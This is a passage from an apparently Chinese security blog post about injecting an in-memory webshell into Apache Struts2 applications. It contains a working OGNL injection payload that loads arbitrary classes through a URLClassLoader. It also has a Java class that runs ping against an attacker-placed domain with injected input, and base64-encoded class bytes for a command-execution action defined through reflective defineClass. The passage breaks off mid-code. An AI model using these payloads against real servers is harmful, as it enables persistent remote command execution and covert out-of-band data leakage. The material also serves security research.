<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
<div id="app">
<h3 data-content="1" id="a3d90e1f77ad1e70ea4ab847e6e6c4c2">0x01 背景</h3>
<p>之前写过一篇关于Struts2绕过的文章，当时就想过怎么去注入内存马，不然加载恶意类去执行命令，也挺烦的，再加上一直都没有看到过struts2内存马注入的工具、文章，奈何当时太菜，没有继续深入；前几天被mc提醒了一下，说是看到过Struts2内存马的一篇文章(放到文末了)，去看了一下，又勾起了对struts2内存马的研究欲望；</p>
<h3 data-content="1" id="a68e10d3613f74072e3add790b3f6995">0x02 代码注入内存马成功</h3>
<p>在action直接执行命令，是可以直接注入内存马</p>
<p>struts.xml如下</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230228131351-b0ba5ad6-b726-1.png"/></p>
<p>当访问login111的test2函数，注入内存马</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230228131359-b5787d00-b726-1.png"/></p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230228131405-b8cbffe0-b726-1.png"/></p>
<p>执行命令</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230228131412-bd2e5e8e-b726-1.png"/></p>
<h3 data-content="1" id="5c8a0d594e512c39717c1d3a166c0c41">0x03 ognl注入内存马失败</h3>
<h4 data-content="1" id="6dca75e1b78c4ef112b1e6cae7249216">0x001 ognl注入失败的问题</h4>
<p>这里想通过ognl表达式去注入内存马，发现不行，原因如下:</p>
<ul>
<li>如果把函数全部放到恶意类class里面，会找不到ActionContext.class，从而报错</li>
<li>如果打算把函数全部放到ognl表达式里面，会发现在进行Thread创建对象的时候无法创建</li>
</ul>
<p>当尝试使用ognl表达式一直赋值到obj5，再通过恶意类加载剩余的函数时，发现注入不了内存马，原因还是在于Classloader的问题，找不到相应的class，一直到这里，也不是没有收获的</p>
<p>发现了一个有点用的东西，可能可以进行自定义命令运行，如下:</p>
<p>这里payload含义是加载了hello.class，传入了cccc这个参数</p>
<div class="highlight"><pre><span></span>redirect:http://www.baidu.com<span class="si">${#</span><span class="nv">req</span><span class="p">=#context.get(</span><span class="s1">'co'</span><span class="p">+</span><span class="s1">'m.open'</span><span class="p">+</span><span class="s1">'symphony.xwo'</span><span class="p">+</span><span class="s1">'rk2.disp'</span><span class="p">+</span><span class="s1">'atcher.HttpSer'</span><span class="p">+</span><span class="s1">'vletReq'</span><span class="p">+</span><span class="s1">'uest'</span><span class="p">),#resp=#context.get(</span><span class="s1">'co'</span><span class="p">+</span><span class="s1">'m.open'</span><span class="p">+</span><span class="s1">'symphony.xwo'</span><span class="p">+</span><span class="s1">'rk2.disp'</span><span class="p">+</span><span class="s1">'atcher.HttpSer'</span><span class="p">+</span><span class="s1">'vletRes'</span><span class="p">+</span><span class="s1">'ponse'</span><span class="p">),#resp.setCharacterEncoding(</span><span class="s1">'UTF-8'</span><span class="p">),#ot=#resp.getWriter (),#bb0=new java.net.URL[]{new java.net.URL(</span><span class="s2">"file:/xxxx/xxxxx"</span><span class="p">)</span><span class="si">}</span>,#cc0<span class="o">=</span>new java.net.URLClassLoader<span class="o">(</span><span class="c1">#bb0),#cc1=#cc0.loadClass("hello"),#ot.print(#cc1.getDeclaredMethods()[0].invoke("main",new java.lang.String[]{"a"},"cccc")),#ot.flush(),#ot.close()}</span>
</pre></div>
<p>hello.class如下</p>
<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">java.lang.Runtime</span><span class="o">;</span>  
<span class="kn">import</span> <span class="nn">java.lang.Process</span><span class="o">;</span>  

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">hello1</span> <span class="o">{</span>  
    <span class="kd">public</span> <span class="nf">hello1</span><span class="o">(</span><span class="n">String</span> <span class="n">a</span><span class="o">)</span> <span class="o">{</span>  
        <span class="k">try</span> <span class="o">{</span>  
            <span class="n">String</span><span class="o">[]</span> <span class="n">commands</span> <span class="o">=</span> <span class="o">{</span> <span class="s">"ping"</span><span class="o">,</span><span class="s">"-c"</span><span class="o">,</span><span class="s">"1"</span> <span class="o">,</span><span class="n">a</span> <span class="o">+</span> <span class="s">"123412.xxxx.xxxxx.cn"</span> <span class="o">};</span>  
            <span class="n">Process</span> <span class="n">pc</span> <span class="o">=</span> <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="n">commands</span><span class="o">);</span>  
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>  
        <span class="o">}</span>    <span class="o">}</span>  
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">,</span> <span class="n">String</span> <span class="n">a</span><span class="o">)</span> <span class="o">{</span>  
        <span class="n">hello1</span> <span class="n">aa</span> <span class="o">=</span> <span class="k">new</span> <span class="n">hello1</span><span class="o">(</span><span class="n">a</span><span class="o">);</span>  
    <span class="o">}</span>  
<span class="o">}</span>
</pre></div>
<p>可以自定义对域名进行请求，那么可以扩展成为shell去执行任意命令，而不需要去更改class</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230228131430-c7773aa0-b726-1.png"/></p>
<h4 data-content="1" id="b27aa0f6b4d968f5eb4797f3a61a16ca">0x002 问题1</h4>
<p>接着说问题1，如果找不到ActionContext.class</p>
<p>贴上当时问的很傻的问题(classloader不同，当然不能这么放类)</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230228131435-cad5e494-b726-1.png"/></p>
<p>那么我直接通过ClassLoader.defineClass去加载这个类呢</p>
<div class="highlight"><pre><span></span><span class="c1">//import org.apache.catalina.loader.WebappClassLoaderBase;  </span>
<span class="c1">//import org.apache.struts2.ServletActionContext;  </span>

<span class="kn">import</span> <span class="nn">java.io.FileWriter</span><span class="o">;</span>  
<span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>  
<span class="kn">import</span> <span class="nn">java.lang.reflect.InvocationTargetException</span><span class="o">;</span>  
<span class="kn">import</span> <span class="nn">java.net.URL</span><span class="o">;</span>  
<span class="kn">import</span> <span class="nn">java.net.URLClassLoader</span><span class="o">;</span>  
<span class="kn">import</span> <span class="nn">java.security.SecureClassLoader</span><span class="o">;</span>  
<span class="kn">import</span> <span class="nn">java.util.Arrays</span><span class="o">;</span>  
<span class="kn">import</span> <span class="nn">java.util.LinkedHashMap</span><span class="o">;</span>  


<span class="kn">import</span> <span class="nn">com.opensymphony.xwork2.config.entities.ActionConfig</span><span class="o">;</span>  
<span class="kn">import</span> <span class="nn">com.opensymphony.xwork2.util.location.Located</span><span class="o">;</span>  
<span class="kn">import</span> <span class="nn">java.net.URLClassLoader</span><span class="o">;</span>  

<span class="cm">/**  </span>
<span class="cm"> * @DESCRIPTION:  </span>
<span class="cm"> * @USER: f0ng  </span>
<span class="cm"> * @DATE: 2023/2/23 下午3:44  </span>
<span class="cm"> */</span><span class="kd">public</span> <span class="kd">class</span> <span class="nc">hello</span> <span class="o">{</span>  
    <span class="kd">public</span> <span class="nf">hello</span><span class="o">(</span><span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">LinkedHashMap</span> <span class="n">obj5</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>  
        <span class="k">try</span> <span class="o">{</span>  
                <span class="n">String</span> <span class="n">s</span> <span class="o">=</span> <span class="s">"yv66vgAAADQApAoAIQBFCgBGAEcHAEgIAEkKAEYASgcASwgATAcATQsACABOBwBPCgBQAFEIAFILAAYAUwoAUABUCgBVAFYKAAoAVwgAWAoACgBZCgAKAFoKAFsAXAoAWwBdCgBeAF8HAGAKAGEAYgoAXgBjCgBkAGUJAGYAZwoAaABpCgBqAGsKADoAbAoAbQBuCgBqAFwHAG8BAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAFUxjb20vZGVtby9hY3Rpb24vQ21kOwEAB2V4ZWN1dGUBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEAB3JlcXVlc3QBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAAhyZXNwb25zZQEAKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsBAApFeGNlcHRpb25zBwBwAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARhcmdzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEABHBvb2wBABVMamF2YXNzaXN0L0NsYXNzUG9vbDsBAAVjbGF6egEAE0xqYXZhc3Npc3QvQ3RDbGFzczsBAAdlbmNvZGVyBwBxAQAHRW5jb2RlcgEADElubmVyQ2xhc3NlcwEAGkxqYXZhL3V0aWwvQmFzZTY0JEVuY29kZXI7AQABcwEAEkxqYXZhL2xhbmcvU3RyaW5nOwcAcgcAcwcAdAEAClNvdXJjZUZpbGUBAAhDbWQuamF2YQwAIgAjBwB1DAB2AHcBACBvcmcvYXBhY2hlL3N0cnV0czIvU3RydXRzU3RhdGljcwEANWNvbS5vcGVuc3ltcGhvbnkueHdvcmsyLmRpc3BhdGNoZXIuSHR0cFNlcnZsZXRSZXF1ZXN0DAB4AHkBACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0AQA2Y29tLm9wZW5zeW1waG9ueS54d29yazIuZGlzcGF0Y2hlci5IdHRwU2VydmxldFJlc3BvbnNlAQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UMAHoAewEAEWphdmEvdXRpbC9TY2FubmVyBwB8DAB9AH4BAAFjDAB/AIAMAIEAggcAgwwAhACFDAAiAIYBAAJcQQwAhwCIDACJACoHAIoMAIsAjAwAjQAjBwCODACPAJABABNjb20vZGVtby9hY3Rpb24vQ21kBwCRDACSACoMAHgAkwcAlAwAlQCWBwCXDACYAJkHAJoMAJsAnAcAnQwAiwCeDACfAKAHAKEMAKIAowEAEGphdmEvbGFuZy9PYmplY3QBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQAYamF2YS91dGlsL0Jhc2U2NCRFbmNvZGVyAQAbamF2YXNzaXN0L05vdEZvdW5kRXhjZXB0aW9uAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAIGphdmFzc2lzdC9DYW5ub3RDb21waWxlRXhjZXB0aW9uAQAlY29tL29wZW5zeW1waG9ueS94d29yazIvQWN0aW9uQ29udGV4dAEACmdldENvbnRleHQBACkoKUxjb20vb3BlbnN5bXBob255L3h3b3JrMi9BY3Rpb25Db250ZXh0OwEAA2dldAEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9PYmplY3Q7AQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAAxnZXRQYXJhbWV0ZXIBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsBAARuZXh0AQATamF2YS9pby9QcmludFdyaXRlcgEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAAVmbHVzaAEAE2phdmFzc2lzdC9DbGFzc1Bvb2wBAApnZXREZWZhdWx0AQAXKClMamF2YXNzaXN0L0NsYXNzUG9vbDsBAA9qYXZhL2xhbmcvQ2xhc3MBAAdnZXROYW1lAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YXNzaXN0L0N0Q2xhc3M7AQAQamF2YS91dGlsL0Jhc2U2NAEACmdldEVuY29kZXIBABwoKUxqYXZhL3V0aWwvQmFzZTY0JEVuY29kZXI7AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAEWphdmFzc2lzdC9DdENsYXNzAQAKdG9CeXRlY29kZQEABCgpW0IBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAEKEkpVgEADmVuY29kZVRvU3RyaW5nAQAWKFtCKUxqYXZhL2xhbmcvU3RyaW5nOwEAEGphdmEvbGFuZy9TdHJpbmcBAAZsZW5ndGgBAAMoKUkAIQAXACEAAAAAAAMAAQAiACMAAQAkAAAALwABAAEAAAAFKrcAAbEAAAACACUAAAAGAAEAAAAQACYAAAAMAAEAAAAFACcAKAAAAAEAKQAqAAIAJAAAAJoABgADAAAATLgAAhIEtgAFwAAGTLgAAhIHtgAFwAAITSy5AAkBALsAClm4AAsrEgy5AA0CALYADrYAD7cAEBIRtgAStgATtgAULLkACQEAtgAVAbAAAAACACUAAAAWAAUAAAATAAwAFAAYABYAQQAXAEoAGAAmAAAAIAADAAAATAAnACgAAAAMAEAAKwAsAAEAGAA0AC0ALgACAC8AAAAEAAEAMAAJADEAMgACACQAAACpAAIABQAAADu4ABZMKxIXtgAYtgAZTbgAGk6yABsstgAcvrYAHS0stgActgAeOgSyABsZBLYAH7YAHbIAGxkEtgAgsQAAAAIAJQAAACIACAAAAB0ABAAfAA4AIQASACMAHQAkACcAJQAyACYAOgAnACYAAAA0AAUAAAA7ADMANAAAAAQANwA1ADYAAQAOAC0ANwA4AAIAEgApADkAPQADACcAFAA+AD8ABAAvAAAACAADAEAAQQBCAAIAQwAAAAIARAA8AAAACgABADoAZAA7AAk="</span><span class="o">;</span>  
                <span class="n">URLClassLoader</span> <span class="n">loader</span> <span class="o">=</span> <span class="k">new</span> <span class="n">URLClassLoader</span><span class="o">(</span><span class="k">new</span> <span class="n">URL</span><span class="o">[</span><span class="mi">0</span><span class="o">],</span> <span class="n">Thread</span><span class="o">.</span><span class="na">currentThread</span><span class="o">().</span><span class="na">getContextClassLoader</span><span class="o">());</span>  
                <span class="kt">byte</span><span class="o">[]</span> <span class="n">decode</span> <span class="o">=</span> <span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">Base64</span><span class="o">.</span><span class="na">getDecoder</span><span class="o">().</span><span class="na">decode</span><span class="o">(</span><span class="n">s</span><span class="o">);</span>  
                <span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">reflect</span><span class="o">.</span><span class="na">Method</span> <span class="n">var47</span> <span class="o">=</span> <span class="n">ClassLoader</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getDeclaredMethod</span><span class="o">(</span><span class="s">"defineClass"</span><span class="o">,</span> <span class="n">String</span><span class="o">.</span><span class="na">class</span><span class="o">,</span> <span class="kt">byte</span><span class="o">[].</span><span class="na">class</span><span class="o">,</span> <span class="n">Integer</span><span class="o">.</span><span class="na">TYPE</span><span class="o">,</span> <span class="n">Integer</span><span class="o">.</span><span class="na">TYPE</span><span class="o">);</span>  
                <span class="n">var47</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>  

                <span class="n">var47</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="n">loader</span><span class="o">,</span> <span class="s">"com.demo.action.Cmd"</span><span class="o">,</span> <span class="n">decode</span><span class="o">,</span> <span class="n">Integer</span><span class="o">.</span><span class="na">valueOf</span><span class="o">(</span><span class="s">"0"</span><span class="o">),</span> <span class="n">decode</span><span class="o">.</span><span class="na">length</span><span class="o">);</span>  

                <span class="n">String</span> <span class="n">s2</span> <span class="o">=</span> <span class="s">"yv66vgAAADEAtAkAHAB4CgAsAHkJABwAegkAHAB7CQAcAHwHAH0KAAYAeQkAHAB+CQAcAH8HAIAKAAoAeQkAHACBCQAcAIIHAIMKAA4AeQkAHACECQAcAIUKAAYAhgoACgCHCgAOAIcLAIgAiQgAigsAiACLCwCMAI0KAI4AjwgAkAsAiACRBwCSCgCTAI8KAJMAlAoAjgCUBwCVCgAgAHkIAJYKACAAlwgAmAgAmQgAmggAmwgAnAoAIACdCACeCgAgAJ8HAKAHAKEHAKIBAAdCdWlsZGVyAQAMSW5uZXJDbGFzc2VzAQAOREVGQVVMVF9NRVRIT0QBABJMamF2YS9sYW5nL1N0cmluZzsBAA1Db25zdGFudFZhbHVlAQAIV0lMRENBUkQBAAxpbnRlcmNlcHRvcnMBABBMamF2YS91dGlsL0xpc3Q7AQAJU2lnbmF0dXJlAQBOTGphdmEvdXRpbC9MaXN0PExjb20vb3BlbnN5bXBob255L3h3b3JrMi9jb25maWcvZW50aXRpZXMvSW50ZXJjZXB0b3JNYXBwaW5nOz47AQAGcGFyYW1zAQAPTGphdmEvdXRpbC9NYXA7AQA1TGphdmEvdXRpbC9NYXA8TGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9TdHJpbmc7PjsBAAdyZXN1bHRzAQBZTGphdmEvdXRpbC9NYXA8TGphdmEvbGFuZy9TdHJpbmc7TGNvbS9vcGVuc3ltcGhvbnkveHdvcmsyL2NvbmZpZy9lbnRpdGllcy9SZXN1bHRDb25maWc7PjsBABFleGNlcHRpb25NYXBwaW5ncwEAUkxqYXZhL3V0aWwvTGlzdDxMY29tL29wZW5zeW1waG9ueS94d29yazIvY29uZmlnL2VudGl0aWVzL0V4Y2VwdGlvbk1hcHBpbmdDb25maWc7PjsBAAljbGFzc05hbWUBAAptZXRob2ROYW1lAQALcGFja2FnZU5hbWUBAARuYW1lAQAOYWxsb3dlZE1ldGhvZHMBAA9MamF2YS91dGlsL1NldDsBACNMamF2YS91dGlsL1NldDxMamF2YS9sYW5nL1N0cmluZzs+OwEABjxpbml0PgEAOShMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZzspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQA2TGNvbS9vcGVuc3ltcGhvbnkveHdvcmsyL2NvbmZpZy9lbnRpdGllcy9BY3Rpb25Db25maWc7AQA5KExjb20vb3BlbnN5bXBob255L3h3b3JrMi9jb25maWcvZW50aXRpZXMvQWN0aW9uQ29uZmlnOylWAQAEb3JpZwEAB2dldE5hbWUBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEADGdldENsYXNzTmFtZQEAFGdldEV4Y2VwdGlvbk1hcHBpbmdzAQASKClMamF2YS91dGlsL0xpc3Q7AQBUKClMamF2YS91dGlsL0xpc3Q8TGNvbS9vcGVuc3ltcGhvbnkveHdvcmsyL2NvbmZpZy9lbnRpdGllcy9FeGNlcHRpb25NYXBwaW5nQ29uZmlnOz47AQAPZ2V0SW50ZXJjZXB0b3JzAQBQKClMamF2YS91dGlsL0xpc3Q8TGNvbS9vcGVuc3ltcGhvbnkveHdvcmsyL2NvbmZpZy9lbnRpdGllcy9JbnRlcmNlcHRvck1hcHBpbmc7PjsBABFnZXRBbGxvd2VkTWV0aG9kcwEAESgpTGphdmEvdXRpbC9TZXQ7AQAlKClMamF2YS91dGlsL1NldDxMamF2YS9sYW5nL1N0cmluZzs+OwEADWdldE1ldGhvZE5hbWUBAA5nZXRQYWNrYWdlTmFtZQEACWdldFBhcmFtcwEAESgpTGphdmEvdXRpbC9NYXA7AQA3KClMamF2YS91dGlsL01hcDxMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmluZzs+OwEACmdldFJlc3VsdHMBAFsoKUxqYXZhL3V0aWwvTWFwPExqYXZhL2xhbmcvU3RyaW5nO0xjb20vb3BlbnN5bXBob255L3h3b3JrMi9jb25maWcvZW50aXRpZXMvUmVzdWx0Q29uZmlnOz47AQAPaXNBbGxvd2VkTWV0aG9kAQAVKExqYXZhL2xhbmcvU3RyaW5nOylaAQAGbWV0aG9kAQAGZXF1YWxzAQAVKExqYXZhL2xhbmcvT2JqZWN0OylaAQABbwEAEkxqYXZhL2xhbmcvT2JqZWN0OwEADGFjdGlvbkNvbmZpZwEACGhhc2hDb2RlAQADKClJAQAGcmVzdWx0AQABSQEACHRvU3RyaW5nAQACc2IBABlMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAKYWNjZXNzJDAwMgEAmChMY29tL29wZW5zeW1waG9ueS94d29yazIvY29uZmlnL2VudGl0aWVzL0FjdGlvbkNvbmZpZztMY29tL29wZW5zeW1waG9ueS94d29yazIvdXRpbC9sb2NhdGlvbi9Mb2NhdGlvbjspTGNvbS9vcGVuc3ltcGhvbnkveHdvcmsyL3V0aWwvbG9jYXRpb24vTG9jYXRpb247AQACeDABAAJ4MQEAMExjb20vb3BlbnN5bXBob255L3h3b3JrMi91dGlsL2xvY2F0aW9uL0xvY2F0aW9uOwEAClNvdXJjZUZpbGUBABFBY3Rpb25Db25maWcuamF2YQwAowB1DABHAKQMAEIAMgwAQwAyDABAADIBABdqYXZhL3V0aWwvTGlua2VkSGFzaE1hcAwAOQA6DAA8ADoBABNqYXZhL3V0aWwvQXJyYXlMaXN0DAA1ADYMAD4ANgEAEWphdmEvdXRpbC9IYXNoU2V0DABEAEUMAEEAMgwARwClDABHAKYHAKcMAKgAawEAASoMAKkAqgcAqwwArACtBwCuDABlAGYBAAdleGVjdXRlDACvAGYBADRjb20vb3BlbnN5bXBob255L3h3b3JrMi9jb25maWcvZW50aXRpZXMvQWN0aW9uQ29uZmlnBwCwDABqAGsBABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgEADntBY3Rpb25Db25maWcgDACxALIBAAIgKAEAAS4BAAIoKQEAASkBAAMgLSAMALEAswEAAX0MAG4AUQEALWNvbS9vcGVuc3ltcGhvbnkveHdvcmsyL3V0aWwvbG9jYXRpb24vTG9jYXRlZAEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQA8Y29tL29wZW5zeW1waG9ueS94d29yazIvY29uZmlnL2VudGl0aWVzL0FjdGlvbkNvbmZpZyRCdWlsZGVyAQAIbG9jYXRpb24BAAMoKVYBABIoTGphdmEvdXRpbC9NYXA7KVYBABkoTGphdmEvdXRpbC9Db2xsZWN0aW9uOylWAQANamF2YS91dGlsL1NldAEABHNpemUBAAhpdGVyYXRvcgEAFigpTGph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AAostAAQxgAFA6wErAAAAAIASgAAAFIAFAAAAJEABQCSAAcAlQAOAJYAEACZABUAmwA0AJwANgCfAFUAoABXAKMAdgClAHgAqACXAKkAmQCsALgArQC6ALAA2QCxANsAtAD6ALUA/AC4AEsAAAAgAAMAAAD+AEwATQAAAAAA/gBnAGgAAQAVAOkAaQBNAAIAAQBqAGsAAQBJAAABLQACAAIAAADVKrQADMYADSq0AAy2AB6nAAQDPBAfG2gqtAAIxgANKrQACLYAHqcABANgPBAfG2gqtAAJxgANKrQACbYAHqcABANgPBAfG2gqtAANxgANKrQADbYAHqcABANgPBAfG2gqtAAFxgANKrQABbYAH6cABANgPBAfG2gqtAARxgANKrQAEbYAH6cABANgPBAfG2gqtAADxgANKrQAA7YAH6cABANgPBAfG2gqtAAExgANKrQABLYAH6cABANgPBAfG2gqtAAQxgANKrQAELYAHqcABANgPBusAAAAAgBKAAAAKgAKAAAAvQATAL4AKwC/AEMAwABbAMEAcwDCAIsAwwCjAMQAuwDFANMAxgBLAAAAFgACAAAA1QBMAE0AAAATAMIAbABtAAEAAQBuAFEAAQBJAAAAuQACAAIAAABhuwAgWbcAIUwrEiK2ACNXKyq0AAS2ACMSJLYAI1crKrQABbYAI1cqtAARxgAWKxIltgAjKrQAEbYAIxImtgAjVysSJ7YAI1crEii2ACMqtAABtgApVysSKrYAI1crtgArsAAAAAIASgAAACoACgAAAMoACADLAA8AzAAdAM0AJgDOAC0AzwBAANEARwDSAFUA0wBcANQASwAAABYAAgAAAGEATABNAAAACABZAG8AcAABEAgAcQByAAEASQAAADsAAwACAAAAByorWrUAAbAAAAACAEoAAAAGAAEAAAAxAEsAAAAWAAIAAAAHAHMATQAAAAAABwB0AHUAAQACAHYAAAACAHcAMAAAAAoAAQAuABwALwAJ"</span><span class="o">;</span>  
            <span class="n">java</span><span class="o">.</span><span class="na">security</span><span class="o">.</span><span class="na">SecureClassLoader</span> <span class="n">loader2</span> <span class="o">=</span> <span class="o">(</span><span class="n">SecureClassLoader</span><span class="o">)</span> <span class="k">this</span><span class="o">.</span><span class="na">getClass</span><span class="o">().</span><span class="na">getClassLoader</span><span class="o">();</span>  

                <span class="kt">byte</span><span class="o">[]</span> <span class="n">decode2</span> <span class="o">=</span> <span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">Base64</span><span class="o">.</span><span class="na">getDecoder</span><span class="o">().</span><span class="na">decode</span><span class="o">(</span><span class="n">s2</span><span class="o">);</span>  
